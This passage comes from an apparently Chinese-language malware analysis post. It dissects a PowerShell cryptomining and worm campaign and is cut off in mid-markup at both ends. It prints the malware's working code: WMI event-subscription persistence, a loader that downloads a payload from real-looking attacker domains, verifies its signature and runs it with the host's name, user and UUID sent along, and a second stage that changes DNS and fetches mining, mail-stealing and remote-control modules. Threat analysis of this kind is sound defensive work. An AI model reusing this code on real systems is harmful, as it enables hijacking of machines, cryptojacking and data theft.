style="--0:#BD976A;--1:#B07D48">Query</span><span style="--0:#666666;--1:#999999">=</span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#C98A7D;--1:#B56959">SELECT * FROM __InstanceModificationEvent WITHIN 3600 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'</span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#666666;--1:#999999">;</span></div></div><div class="ec-line"><div class="code"><span class="indent"><span style="--0:#DBD7CAEE;--1:#393A34">        </span></span><span style="--0:#DBD7CAEE;--1:#393A34">} -ErrorAction Stop</span><span style="--0:#666666;--1:#999999">);</span></div></div><div class="ec-line"><div class="code"><span class="indent">        </span><span style="--0:#BD976A;--1:#B07D48">Consumer</span><span style="--0:#666666;--1:#999999">=(</span><span style="--0:#C98A7D;--1:#B56959">Set-WmiInstance</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D;--1:#B56959">-Class</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D;--1:#B56959">CommandLineEventConsumer</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D;--1:#B56959">-Namespace</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#C98A7D;--1:#B56959">root\subscription</span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D;--1:#B56959">-Arguments</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D;--1:#B56959">@{</span><span style="--0:#BD976A;--1:#B07D48">Name</span><span style="--0:#666666;--1:#999999">=</span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#C98A7D;--1:#B56959">c</span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#C98A7D;--1:#B56959">+</span><span style="--0:#BD976A;--1:#B07D48">$theName</span><span style="--0:#666666;--1:#999999">;</span></div></div><div class="ec-line"><div class="code"><span class="indent">        </span><span style="--0:#BD976A;--1:#B07D48">ExecutablePath</span><span style="--0:#666666;--1:#999999">=</span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#C98A7D;--1:#B56959">c:\windows\system32\cmd.exe</span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#666666;--1:#999999">;</span></div></div><div class="ec-line"><div class="code"><span class="indent">        </span><span style="--0:#BD976A;--1:#B07D48">CommandLineTemplate</span><span style="--0:#666666;--1:#999999">=</span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#C98A7D;--1:#B56959">/c powershell -w hidden -c $wmicmd</span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#C98A7D;--1:#B56959">}</span><span style="--0:#666666;--1:#999999">)</span><span style="--0:#DBD7CAEE;--1:#393A34">}</span></div></div><div class="ec-line"><div class="code"><span class="indent">        </span><span style="--0:#80A665;--1:#59873A">start-sleep</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#4C9A91;--1:#2F798A">5</span></div></div><div class="ec-line"><div class="code"><span class="indent"><span style="--0:#DBD7CAEE;--1:#393A34">    </span></span><span style="--0:#DBD7CAEE;--1:#393A34">}</span></div></div><div class="ec-line"><div class="code">
</div></div><div class="ec-line"><div class="code"><span style="--0:#758575DD;--1:#A0ADA0">#对下载的a.jsp进行校验,下载后会触发「校验机制」（长度≥173→解密前 173 字符→SHA1 校验，校验通过才执行）</span></div></div><div class="ec-line"><div class="code"><span style="--0:#BD976A;--1:#B07D48">$tmps</span><span style="--0:#DBD7CAEE;--1:#393A34">=</span><span style="--0:#CB7676;--1:#AB5959">function</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#80A665;--1:#59873A">a</span><span style="--0:#666666;--1:#999999">(</span><span style="--0:#BD976A;--1:#B07D48">$u</span><span style="--0:#666666;--1:#999999">){</span><span style="--0:#BD976A;--1:#B07D48">$d</span><span style="--0:#DBD7CAEE;--1:#393A34">=(</span><span style="--0:#80A665;--1:#59873A">Ne</span><span style="--0:#666666;--1:#999999">`</span><span style="--0:#80A665;--1:#59873A">w-Obj</span><span style="--0:#666666;--1:#999999">`</span><span style="--0:#80A665;--1:#59873A">ect</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D;--1:#B56959">Net.WebC</span><span style="--0:#666666;--1:#999999">`</span><span style="--0:#80A665;--1:#59873A">lient</span><span style="--0:#C98A7D;--1:#B56959">).</span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#C98A7D;--1:#B56959">DownloadData</span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#C98A7D;--1:#B56959">($u)</span><span style="--0:#666666;--1:#999999">;</span></div></div><div class="ec-line"><div class="code"><span style="--0:#C98A7D;--1:#B56959">$c=$d.count</span><span style="--0:#666666;--1:#999999">;</span></div></div><div class="ec-line"><div class="code"><span style="--0:#80A665;--1:#59873A">if($c</span><span style="--0:#C98A7D;--1:#B56959"> </span><span style="--0:#C99076;--1:#A65E2B">-gt</span><span style="--0:#C98A7D;--1:#B56959"> </span><span style="--0:#4C9A91;--1:#2F798A">173</span><span style="--0:#C98A7D;--1:#B56959">){$b=$d</span><span style="--0:#666666;--1:#999999">[</span><span style="--0:#C98A7D;--1:#B56959">173..$c</span><span style="--0:#666666;--1:#999999">];</span></div></div><div class="ec-line"><div class="code"><span style="--0:#C98A7D;--1:#B56959">$p=New-Object Security.Cryptography.RSAParameters</span><span style="--0:#666666;--1:#999999">;</span></div></div><div class="ec-line"><div class="code"><span style="--0:#C98A7D;--1:#B56959">$p.Modulus=[convert]</span><span style="--0:#B8A965;--1:#998418">:</span><span style="--0:#C98A7D;--1:#B56959">:FromBase64String(</span><span style="--0:#80A665;--1:#59873A">''2mWo17uXvG1BXpmdgv8v/3NTmnNubHtV62fWrk4jPFI9wM3NN2vzTzticIYHlm7K3r2mT/YR0WDciL818pLubLgum30r0Rkwc8ZSAc3nxzR4iqef4hLNeUCnkWqulY5C0M85bjDLCpjblz/2LpUQcv1j1feIY6R7rpfqOLdHa10</span><span style="--0:#C98A7D;--1:#B56959">=</span><span style="--0:#80A665;--1:#59873A">''</span><span style="--0:#C98A7D;--1:#B56959">)</span><span style="--0:#666666;--1:#999999">;</span></div></div><div class="ec-line"><div class="code"><span style="--0:#C98A7D;--1:#B56959">$p.Exponent=0x01,0x00,0x01</span><span style="--0:#666666;--1:#999999">;</span></div></div><div class="ec-line"><div class="code"><span style="--0:#C98A7D;--1:#B56959">$r=New-Object Security.Cryptography.RSACryptoServiceProvider</span><span style="--0:#666666;--1:#999999">;</span></div></div><div class="ec-line"><div class="code"><span style="--0:#C98A7D;--1:#B56959">$r.ImportParameters($p)</span><span style="--0:#666666;--1:#999999">;</span></div></div><div class="ec-line"><div class="code"><span style="--0:#758575DD;--1:#A0ADA0">#校验</span></div></div><div class="ec-line"><div class="code"><span style="--0:#C98A7D;--1:#B56959">if($r.verifyData($b,(</span><span style="--0:#80A665;--1:#59873A">New-Object</span><span style="--0:#C98A7D;--1:#B56959"> Security.Cryptography.SHA1CryptoServiceProvider),</span><span style="--0:#666666;--1:#999999">[</span><span style="--0:#C98A7D;--1:#B56959">convert</span><span style="--0:#666666;--1:#999999">]</span><span style="--0:#C98A7D;--1:#B56959">::FromBase64String(</span><span style="--0:#80A665;--1:#59873A">-join([char[]]$d[0..171]</span><span style="--0:#C98A7D;--1:#B56959">))))</span></div></div><div class="ec-line"><div class="code"><span style="--0:#758575DD;--1:#A0ADA0">#执行a.jsp</span></div></div><div class="ec-line"><div class="code"><span style="--0:#C98A7D;--1:#B56959">{I`ex(-join[char[]]$b)}}}$url=''http://''+''U1''+''U2'';a($url+''/a.jsp'+$v+'?''+(@($env:COMPUTERNAME,$env:USERNAME,(get-wmiobject Win32_ComputerSystemProduct).UUID,(random))-join''*''))'}</span></div></div></code></pre><div class="copy"><button title="Copy to clipboard" data-copied="Copied!" data-code="$us=@(&#x27;t.zz3r0.com&#x27;,&#x27;t.zer9g.com&#x27;,&#x27;t.amynx.com&#x27;)foreach($u in $us){$theName=getRan$wmicmd=$tmps.replace(&#x27;U1&#x27;,$u.substring(0,5)).replace(&#x27;U2&#x27;,$u.substring(5)).replace(&#x27;a.jsp&#x27;,&#x27;aa.jsp&#x27;)        Set-WmiInstance -Class __FilterToConsumerBinding -Namespace &#x22;root\subscription&#x22; -Arguments @{Filter=(Set-WmiInstance -Class __EventFilter -NameSpace &#x22;root\subscription&#x22; -Arguments @{Name=&#x22;f&#x22;+$theName;        EventNameSpace=&#x22;root\cimv2&#x22;;        QueryLanguage=&#x22;WQL&#x22;;        Query=&#x22;SELECT * FROM __InstanceModificationEvent WITHIN 3600 WHERE TargetInstance ISA &#x27;Win32_PerfFormattedData_PerfOS_System&#x27;&#x22;;        } -ErrorAction Stop);        Consumer=(Set-WmiInstance -Class CommandLineEventConsumer -Namespace &#x22;root\subscription&#x22; -Arguments @{Name=&#x22;c&#x22;+$theName;        ExecutablePath=&#x22;c:\windows\system32\cmd.exe&#x22;;        CommandLineTemplate=&#x22;/c powershell -w hidden -c $wmicmd&#x22;})}        start-sleep 5    }$tmps=function a($u){$d=(Ne&#x60;w-Obj&#x60;ect Net.WebC&#x60;lient).&#x22;DownloadData&#x22;($u);$c=$d.count;if($c -gt 173){$b=$d[173..$c];$p=New-Object Security.Cryptography.RSAParameters;$p.Modulus=[convert]::FromBase64String(&#x27;&#x27;2mWo17uXvG1BXpmdgv8v/3NTmnNubHtV62fWrk4jPFI9wM3NN2vzTzticIYHlm7K3r2mT/YR0WDciL818pLubLgum30r0Rkwc8ZSAc3nxzR4iqef4hLNeUCnkWqulY5C0M85bjDLCpjblz/2LpUQcv1j1feIY6R7rpfqOLdHa10=&#x27;&#x27;);$p.Exponent=0x01,0x00,0x01;$r=New-Object Security.Cryptography.RSACryptoServiceProvider;$r.ImportParameters($p);if($r.verifyData($b,(New-Object Security.Cryptography.SHA1CryptoServiceProvider),[convert]::FromBase64String(-join([char[]]$d[0..171])))){I&#x60;ex(-join[char[]]$b)}}}$url=&#x27;&#x27;http://&#x27;&#x27;+&#x27;&#x27;U1&#x27;&#x27;+&#x27;&#x27;U2&#x27;&#x27;;a($url+&#x27;&#x27;/a.jsp&#x27;+$v+&#x27;?&#x27;&#x27;+(@($env:COMPUTERNAME,$env:USERNAME,(get-wmiobject Win32_ComputerSystemProduct).UUID,(random))-join&#x27;&#x27;*&#x27;&#x27;))&#x27;}"><div></div></button></div></figure></div>
<h3 id="ajsp第二阶段攻击">a.jsp：第二阶段攻击<a class="header-anchor" tab-index="0" aria-hidden="false" aria-label="Link to a.jsp：第二阶段攻击" data-pagefind-ignore="" href="#ajsp第二阶段攻击">#</a></h3>
<p>负责「环境配置 + 模块下载 + 信息回传」，是整个攻击的核心调度器：
<strong>基础配置</strong>：强制修改 DNS 为 8.8.8.8/9.9.9.9（确保外网通信稳定）；</p>
<div class="expressive-code"><figure class="frame is-terminal"><figcaption class="header"><span class="title"></span><span class="sr-only">Terminal window</span></figcaption><pre data-language="bash"><code><div class="ec-line"><div class="code"><span style="--0:#666666;--1:#999999">(</span><span style="--0:#BD976A;--1:#B07D48">get-wmiobject-classwin32_networkadapterconfiguration-filteripenabled</span><span style="--0:#666666;--1:#999999">=</span><span style="--0:#C98A7D;--1:#B56959">true</span><span style="--0:#666666;--1:#999999">)</span><span style="--0:#80A665;--1:#59873A">.SetDNSServerSearchOrder(@(</span><span style="--0:#80A665;--1:#59873A">' 8.8.8.8 '</span><span style="--0:#80A665;--1:#59873A">,</span><span style="--0:#80A665;--1:#59873A">' 9.9.9.9 '</span><span style="--0:#DBD7CAEE;--1:#393A34">))</span></div></div></code></pre><div class="copy"><button title="Copy to clipboard" data-copied="Copied!" data-code="(get-wmiobject-classwin32_networkadapterconfiguration-filteripenabled=true).SetDNSServerSearchOrder(@(&#x27; 8.8.8.8 &#x27;,&#x27; 9.9.9.9 &#x27;))"><div></div></button></div></figure></div>
<p><strong>模块下载</strong>：按条件拉取各功能 bin 文件（均为 powershell 脚本），下载时同样触发校验机制：
必下：if.bin（横向核心）、kr.bin（挖矿核心）、report.jsp（回传脚本）；
<strong>条件下载</strong>：ode.bin（无 kk4kk.log 时）、if_mail.bin（有 Outlook 且无 godmali4.txt 时）、m6g.bin/nvd.zip（64 位 + 显卡时）；</p>
<div class="expressive-code"><figure class="frame is-terminal"><figcaption class="header"><span class="title"></span><span class="sr-only">Terminal window</span></figcaption><pre data-language="bash"><code><div class="ec-line"><div class="code"><span style="--0:#758575DD;--1:#A0ADA0">#定义恶意文件名称+MD5（用于校验，防止篡改）</span></div></div><div class="ec-line"><div class="code"><span style="--0:#BD976A;--1:#B07D48">$ifbin</span><span style="--0:#DBD7CAEE;--1:#393A34"> = </span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#C98A7D;--1:#B56959">if.bin</span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#666666;--1:#999999">;</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#BD976A;--1:#B07D48">$ifmd5</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D;--1:#B56959">=</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#C98A7D;--1:#B56959">888dc1ca4b18a3d424498244acf81f7d</span><span style="--0:#C98A7D77;--1:#B5695977">"</span></div></div><div class="ec-line"><div class="code"><span style="--0:#BD976A;--1:#B07D48">$krbin</span><span style="--0:#DBD7CAEE;--1:#393A34"> = </span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#C98A7D;--1:#B56959">kr.bin</span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#666666;--1:#999999">;</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#BD976A;--1:#B07D48">$krmd5</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D;--1:#B56959">=</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#C98A7D;--1:#B56959">e04acec7ab98362d87d1c53d84fc4b03</span><span style="--0:#C98A7D77;--1:#B5695977">"</span></div></div><div class="ec-line"><div class="code"><span style="--0:#4D9375;--1:#1E754F">if</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#666666;--1:#999999">(</span><span style="--0:#BD976A;--1:#B07D48">$is64</span><span style="--0:#666666;--1:#999999">)</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#666666;--1:#999999">{</span></div></div><div class="ec-line"><div class="code"><span class="indent">    </span><span style="--0:#BD976A;--1:#B07D48">$mbin</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D;--1:#B56959">=</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#C98A7D;--1:#B56959">m6.bin</span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#666666;--1:#999999">;</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#BD976A;--1:#B07D48">$mmd5</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D;--1:#B56959">=</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#C98A7D;--1:#B56959">dcd9144d509e7c6e1e63ecdd7e50e935</span><span style="--0:#C98A7D77;--1:#B5695977">"</span></div></div><div class="ec-line"><div class="code"><span class="indent">    </span><span style="--0:#BD976A;--1:#B07D48">$mgbin</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D;--1:#B56959">=</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#C98A7D;--1:#B56959">m6g.bin</span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#666666;--1:#999999">;</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#BD976A;--1:#B07D48">$mgmd5</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D;--1:#B56959">=</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#C98A7D;--1:#B56959">c8242bffbaf1f76085f140e5a7552692</span><span style="--0:#C98A7D77;--1:#B5695977">"</span></div></div><div class="ec-line"><div class="code"><span style="--0:#666666;--1:#999999">}</span></div></div><div class="ec-line"><div class="code"><span style="--0:#758575DD;--1:#A0ADA0">#下载并执行</span></div></div><div class="ec-line"><div class="code"><span style="--0:#80A665;--1:#59873A">SIEX</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#C98A7D;--1:#B56959">$core_url/report.jsp</span><span style="--0:#C98A7D77;--1:#B5695977">"</span></div></div><div class="ec-line"><div class="code"><span style="--0:#758575DD;--1:#A0ADA0">#下载NVIDIA挖矿驱动（针对64位+NVIDIA显卡主机）</span></div></div><div class="ec-line"><div class="code"><span style="--0:#DBD7CAEE;--1:#393A34">if(</span><span style="--0:#BD976A;--1:#B07D48">$isn</span><span style="--0:#DBD7CAEE;--1:#393A34"> -and </span><span style="--0:#BD976A;--1:#B07D48">$is64</span><span style="--0:#DBD7CAEE;--1:#393A34">) </span><span style="--0:#666666;--1:#999999">{</span></div></div><div class="ec-line"><div class="code"><span class="indent">  </span><span style="--0:#BD976A;--1:#B07D48">$nd</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D;--1:#B56959">=</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#C98A7D;--1:#B56959">nvd.zip</span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#666666;--1:#999999">;</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#BD976A;--1:#B07D48">$ndg</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D;--1:#B56959">=</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#C98A7D;--1:#B56959">$env:tmp\nvdg.dat</span><span style="--0:#C98A7D77;--1:#B5695977">"</span></div></div><div class="ec-line"><div class="code"><span class="indent"><span style="--0:#DBD7CAEE;--1:#393A34">  </span></span><span style="--0:#DBD7CAEE;--1:#393A34">if(</span><span style="--0:#CB7676;--1:#AB5959">!</span><span style="--0:#666666;--1:#999999">(</span><span style="--0:#80A665;--1:#59873A">Test-Path</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#BD976A;--1:#B07D48">$ndg</span><span style="--0:#666666;--1:#999999">)</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#80A665;--1:#59873A">-or</span><span style="--0:#DBD7CAEE;--1:#393A34"> (Get-Item </span><span style="--0:#BD976A;--1:#B07D48">$ndg</span><span style="--0:#DBD7CAEE;--1:#393A34">).Length -ne 22035968) </span><span style="--0:#666666;--1:#999999">{</span></div></div><div class="ec-line"><div class="code"><span class="indent">            </span><span style="--0:#666666;--1:#999999">(</span><span style="--0:#80A665;--1:#59873A">New-Object</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D;--1:#B56959">Net.WebClient</span><span style="--0:#666666;--1:#999999">)</span><span style="--0:#80A665;--1:#59873A">.DownloadFile($down_url+</span><span style="--0:#80A665;--1:#59873A">"/</span><span style="--0:#C98A7D;--1:#B56959">$nd</span><span style="--0:#80A665;--1:#59873A">"</span><span style="--0:#80A665;--1:#59873A">,</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#C98A7D;--1:#B56959">$env:tmp</span><span style="--0:#C99076;--1:#A65E2B">\$</span><span style="--0:#C98A7D;--1:#B56959">nd</span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#DBD7CAEE;--1:#393A34">)</span></div></div><div class="ec-line"><div class="code"><span class="indent">            </span><span style="--0:#666666;--1:#999999">(</span><span style="--0:#80A665;--1:#59873A">New-Object</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C99076;--1:#A65E2B">-ComObject</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D;--1:#B56959">Shell.Application</span><span style="--0:#666666;--1:#999999">)</span><span style="--0:#80A665;--1:#59873A">.Namespace($env:tmp</span><span style="--0:#DBD7CAEE;--1:#393A34">).CopyHere(</span><span style="--0:#80A665;--1:#59873A">"</span><span style="--0:#C98A7D;--1:#B56959">$env</span><span style="--0:#80A665;--1:#59873A">:tmp</span><span style="--0:#C99076;--1:#A65E2B">\$</span><span style="--0:#80A665;--1:#59873A">nd\*"</span><span style="--0:#80A665;--1:#59873A">,16</span><span style="--0:#DBD7CAEE;--1:#393A34">)</span></div></div><div class="ec-line"><div class="code"><span class="indent">            </span><span style="--0:#80A665;--1:#59873A">Remove-Item</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#BD976A;--1:#B07D48">$env</span><span style="--0:#C98A7D;--1:#B56959">:tmp</span><span style="--0:#C99076;--1:#A65E2B">\$</span><span style="--0:#C98A7D;--1:#B56959">nd</span></div></div><div class="ec-line"><div class="code"><span class="indent">        </span><span style="--0:#666666;--1:#999999">}</span></div></div><div class="ec-line"><div class="code"><span class="indent">    </span><span style="--0:#666666;--1:#999999">}</span></div></div><div class="ec-line"><div class="code"><span style="--0:#758575DD;--1:#A0ADA0">#执行邮件窃取+额外恶意模块</span></div></div><div class="ec-line"><div class="code"><span style="--0:#DBD7CAEE;--1:#393A34">if(</span><span style="--0:#BD976A;--1:#B07D48">$mflag</span><span style="--0:#DBD7CAEE;--1:#393A34">) </span><span style="--0:#666666;--1:#999999">{</span></div></div><div class="ec-line"><div class="code"><span class="indent">    </span><span style="--0:#80A665;--1:#59873A">try</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D;--1:#B56959">{</span></div></div><div class="ec-line"><div class="code"><span class="indent">        </span><span style="--0:#BD976A;--1:#B07D48">$localMail</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D;--1:#B56959">=</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#BD976A;--1:#B07D48">$false</span></div></div><div class="ec-line"><div class="code"><span class="indent">        </span><span style="--0:#80A665;--1:#59873A">New-Object</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D;--1:#B56959">Threading.Mutex</span><span style="--0:#666666;--1:#999999">(</span><span style="--0:#BD976A;--1:#B07D48">$true</span><span style="--0:#DBD7CAEE;--1:#393A34">, </span><span style="--0:#C98A7D77;--1:#B5695977">'</span><span style="--0:#C98A7D;--1:#B56959">Global\LocalMail</span><span style="--0:#C98A7D77;--1:#B5695977">'</span><span style="--0:#DBD7CAEE;--1:#393A34">, </span><span style="--0:#666666;--1:#999999">[</span><span style="--0:#DBD7CAEE;--1:#393A34">ref</span><span style="--0:#666666;--1:#999999">]</span><span style="--0:#BD976A;--1:#B07D48">$localMail</span><span style="--0:#666666;--1:#999999">)</span></div></div><div class="ec-line"><div class="code"><span class="indent">    </span><span style="--0:#666666;--1:#999999">}</span><span style="--0:#DBD7CAEE;--1:#393A34"> catch </span><span style="--0:#666666;--1:#999999">{}</span></div></div><div class="ec-line"><div class="code"><span class="indent"><span style="--0:#DBD7CAEE;--1:#393A34">    </span></span><span style="--0:#DBD7CAEE;--1:#393A34">if(</span><span style="--0:#BD976A;--1:#B07D48">$localMail</span><span style="--0:#DBD7CAEE;--1:#393A34"> -and </span><span style="--0:#CB7676;--1:#AB5959">!</span><span style="--0:#666666;--1:#999999">(</span><span style="--0:#80A665;--1:#59873A">Test-Path</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#C98A7D;--1:#B56959">$env:tmp\godmali4.txt</span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#666666;--1:#999999">)</span><span style="--0:#DBD7CAEE;--1:#393A34">) </span><span style="--0:#666666;--1:#999999">{</span></div></div><div class="ec-line"><div class="code"><span class="indent">        </span><span style="--0:#80A665;--1:#59873A">SIEX</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#C98A7D;--1:#B56959">$down_url/if_mail.bin</span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#DBD7CAEE;--1:#393A34">  </span><span style="--0:#758575DD;--1:#A0ADA0"># 邮件窃取模块</span></div></div><div class="ec-line"><div class="code"><span class="indent">    </span><span style="--0:#666666;--1:#999999">}</span></div></div><div class="ec-line"><div class="code"><span style="--0:#DBD7CAEE;--1:#393A34">}</span></div></div><div class="ec-line"><div class="code"><span style="--0:#80A665;--1:#59873A">if(!(Test-Path</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#C98A7D;--1:#B56959">$env:tmp\kk4kk.log</span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#DBD7CAEE;--1:#393A34">)) </span><span style="--0:#666666;--1:#999999">{</span></div></div><div class="ec-line"><div class="code"><span class="indent">    </span><span style="--0:#80A665;--1:#59873A">SIEX</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#C98A7D;--1:#B56959">$down_url/ode.bin</span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#DBD7CAEE;--1:#393A34">  </span><span style="--0:#758575DD;--1:#A0ADA0"># 额外恶意模块（远控/数据窃取）</span></div></div><div class="ec-line"><div class="code"><span style="--0:#666666;--1:#999999">}</span></div></div></code></pre><div class="copy"><button title="Copy to clipboard" data-copied="Copied!" data-code="$ifbin = &#x22;if.bin&#x22;; $ifmd5 = &#x22;888dc1ca4b18a3d424498244acf81f7d&#x22;$krbin = &#x22;kr.bin&#x22;; $krmd5 = &#x22;e04acec7ab98362d87d1c53d84fc4b03&#x22;if ($is64) {    $mbin = &#x22;m6.bin&#x22;; $mmd5 = &#x22;dcd9144d509e7c6e1e63ecdd7e50e935&#x22;    $mgbin = &#x22;m6g.bin&#x22;; $mgmd5 = &#x22;c8242bffbaf1f76085f140e5a7552692&#x22;}SIEX &#x22;$core_url/report.jsp&#x22;if($isn -and $is64) {  $nd = &#x22;nvd.zip&#x22;; $ndg = &#x22;$env:tmp\nvdg.dat&#x22;  if(!(Test-Path $ndg) -or (Get-Item $ndg).Length -ne 22035968) {            (New-Object Net.WebClient).DownloadFile($down_url+&#x22;/$nd&#x22;, &#x22;$env:tmp\$nd&#x22;)            (New-Object -ComObject Shell.Application).Namespace($env:tmp).CopyHere(&#x22;$env:tmp\$nd\*&#x22;,16)            Remove-Item $env:tmp\$nd        }    }if($mflag) {    try {        $localMail = $false        New-Object Threading.Mutex($true, &#x27;Global\LocalMail&#x27;, [ref]$localMail)    } catch {}    if($localMail -and !(Test-Path &#x22;$env:tmp\godmali4.txt&#x22;)) {        SIEX &#x22;$down_url/if_mail.bin&#x22;  # 邮件窃取模块    }}if(!(Test-Path &#x22;$env:tmp\kk4kk.log&#x22;)) {    SIEX &#x22;$down_url/ode.bin&#x22;  # 额外恶意模块（远控/数据窃取）}"><div></div></button></div></figure></div>
<p><strong>信息回传</strong>：收集系统关键信息（系统版本 / 位数 / 用户 / 显卡 / 内存 / 权限等）、矿机总算力、3 个下载文件的 MD5，统一回传至t.amynx.com；</p>
<div class="expressive-code"><figure class="frame is-terminal"><figcaption class="header"><span class="title"></span><span class="sr-only">Terminal window</span></figcaption><pre data-language="bash"><code><div class="ec-line"><div class="code"><span style="--0:#758575DD;--1:#A0ADA0"># 采集系统全量指纹</span></div></div><div class="ec-line"><div class="code"><span style="--0:#BD976A;--1:#B07D48">$permit</span><span style="--0:#DBD7CAEE;--1:#393A34"> = (</span><span style="--0:#666666;--1:#999999">[</span><span style="--0:#DBD7CAEE;--1:#393A34">Security.Principal.WindowsPrincipal</span><span style="--0:#666666;--1:#999999">][</span><span style="--0:#DBD7CAEE;--1:#393A34">Security.Principal.WindowsIdentity</span><span style="--0:#666666;--1:#999999">]</span><span style="--0:#80A665;--1:#59873A">::GetCurrent</span><span style="--0:#666666;--1:#999999">()</span><span style="--0:#DBD7CAEE;--1:#393A34">).IsInRole(</span><span style="--0:#666666;--1:#999999">[</span><span style="--0:#DBD7CAEE;--1:#393A34">Security.Principal.WindowsBuiltInRole</span><span style="--0:#666666;--1:#999999">]</span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#C98A7D;--1:#B56959">Administrator</span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#DBD7CAEE;--1:#393A34">)</span></div></div><div class="ec-line"><div class="code"><span style="--0:#BD976A;--1:#B07D48">$comp_name</span><span style="--0:#DBD7CAEE;--1:#393A34"> = </span><span style="--0:#BD976A;--1:#B07D48">$env</span><span style="--0:#DBD7CAEE;--1:#393A34">:COMPUTERNAME</span></div></div><div class="ec-line"><div class="code"><span 